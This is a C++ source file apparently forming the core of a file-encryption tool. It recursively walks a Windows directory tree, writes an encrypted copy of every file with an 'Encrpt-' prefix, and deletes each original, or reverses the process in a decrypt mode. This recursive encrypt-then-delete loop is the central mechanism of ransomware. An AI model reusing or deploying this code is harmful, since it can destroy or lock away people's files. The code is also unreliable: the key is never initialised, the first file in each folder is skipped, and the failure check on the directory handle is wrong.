#include "Filesch.h"
#include<iostream>
#include<list>
#include<string>
#include<Windows.h> 
#include"Encrypt.h"
Filesch::Filesch(int mode)
{
	this->mode = mode;
}

void Filesch::filesch(char *path)//Core Traversing Engine 
{
	string FileName;
	string En_FileName; 
	char flname[1024] ;
	char fulpath[1024];
	string pre_path;
	string directory_path;
	strcpy(flname,path);
	pre_path = flname;
	strcat(flname,"\\*.*");
	//printf("%s\n",flname);
	WIN32_FIND_DATA m;
	HANDLE H;
	H = FindFirstFile(flname,&m);
	if (H==NULL)
    {
		printf("load the fff failed");
	}
     
	 while(FindNextFile(H,&m))
	{
	  if(strcmp(m.cFileName ,".")==0||strcmp(m.cFileName ,"..")==0)
	  {
		  continue;
	  }
	  //puts(m.cFileName);
	  if(m.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY)
	  {
		  wsprintf(fulpath,"%s//%s",path,m.cFileName);
		  filesch(fulpath);
	  }
	  else
	  {
	     FileName = m.cFileName;
	     directory_path = pre_path + "//";
	     if(this->mode==1)// mode equal 1,means to Encrpt;
	     {
	     	En_FileName = "Encrpt-"+FileName;
	     	En_FileName_list.insert(En_FileName_list.end(),En_FileName);
		 }
		 
		 FileName_list.insert(FileName_list.end(),FileName);
		 directory_list.insert(directory_list.end(),directory_path);
		 counter ++;
		 /*it++;
		 cout<<*it<<endl;*/
	  }
	}
}

void Filesch::Work()
{
	char *input;
	char *output;
	string str_transmit_dir;
	string str_transmit_File;
	string str_transmit_EnFile;
	string str_transmit_input;
	string str_transmit_output;
	string str_sub; 
	int key;
	Encrypt en; 
	list<string>::const_iterator dir_it = directory_list.begin();
	list<string>::const_iterator En_File_it = En_FileName_list.begin();
	for(list<string>::const_iterator File_it = FileName_list.begin();File_it!=FileName_list.end();++File_it)
	{
		cout<<*File_it<<endl;
		str_transmit_dir=* dir_it;
		str_transmit_File=* File_it;
		if(this->mode==1)  //mode is 1,means to Encrypt; 
		{
		   str_transmit_EnFile=* En_File_it;	
		  str_transmit_input = str_transmit_dir + str_transmit_File;//input
		  str_transmit_output =str_transmit_dir + str_transmit_EnFile;//output	
		}
		else if(this->mode==0)
		{
		  str_sub = str_transmit_File.substr(7);	
		  str_transmit_input = str_transmit_dir + str_transmit_File;//input
		  str_transmit_output =str_transmit_dir + str_sub;//output
		   
		} 
		input = (char *)str_transmit_input.c_str();
		output= (char*)str_transmit_output.c_str();
		en.FileAttri(output,this->mode);
		en.Enfactor(input,output,key);//Core Function;
		en.del(input);//Del Function;
		dir_it++;
		En_File_it++; 
		input ="";
		output="";
	}  
	
}

Filesch::~Filesch()
{
	 
}

